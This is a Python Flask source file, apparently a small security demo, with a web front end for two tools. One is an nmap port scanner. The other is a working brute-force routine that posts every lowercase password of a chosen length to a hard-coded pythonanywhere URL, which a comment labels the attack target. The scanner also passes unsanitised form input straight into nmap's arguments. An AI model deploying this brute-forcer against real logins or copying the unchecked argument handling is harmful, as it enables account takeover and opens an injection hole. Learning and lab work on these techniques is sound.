from flask import Flask, render_template, request, Response
import random
import nmap
import requests
import itertools
import string
app = Flask(__name__)


URL = "http://suechaehua.pythonanywhere.com"  # 공격 대상 URL
def brute_force_stream(length):
    def generate():
        yield "data: Starting Brute Force Attack...\n"
        max_lines = 1  # 화면에 표시할 최대 줄 수
        logs = []
        
        for count, attempt in enumerate(itertools.product(string.ascii_lowercase, repeat=length), start=1):
            password = ''.join(attempt)
            response = requests.post(URL, data={"password": password})
            log_entry = f"| Trying: {password}"
            
            logs.append(log_entry)
            if len(logs) > max_lines:
                logs.pop(0)  # 오래된 로그 삭제하여 화면 크기 유지
            
            yield " | ".join(logs) + "\n"
            
            if "Wrong" not in response.text:
                yield f"<h4>Success! Password found: {password} \n</h4>"
                break
    
    return Response(generate(), mimetype='text/event-stream')

def scan(address, port):
    nm = nmap.PortScanner()

    
    raw_results = nm.scan(hosts=address, arguments=f'-p {port}')

    
    res_host = ""
    res_proto = ""
    res_port = ""

    
    for host in nm.all_hosts():
        res_host = f"Host: {host} ({nm[host].hostname() or 'unknown'})"
        # print(res_host)
        for proto in nm[host].all_protocols():
            res_proto = f"Protocol: {proto}"
            # print(res_proto)
            lport = nm[host][proto].keys()
            for port in lport:
                state = nm[host][proto][port]['state']
                res_port += f" | Port: {port}, State: {state}\n"
                # print(res_port)

    
    combined_results = f"{res_host}\n{res_proto}\n{res_port}"
    return combined_results

@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/portscanning', methods=['GET', 'POST'])
def portscanning():
    if request.method == 'GET':
        return render_template('portscanning.html')
    if request.method == 'POST':
        address = request.form.get('address')
        port = request.form.get('port')

        
        results = scan(address, port)
        # print(results)

        
        return render_template('portscanning.html', result=results)
    

@app.route('/bruteforce',methods=['GET','POST'])
def bruteforce():
    if request.method == 'GET':
        return render_template('bruteforce.html')
    if request.method == 'POST':
        try:
            length = int(request.form.get("length", 4))
        except ValueError:
            return "Invalid input. Please enter a number."
        return brute_force_stream(length)



app.run(host='127.0.0.1', port=8000)
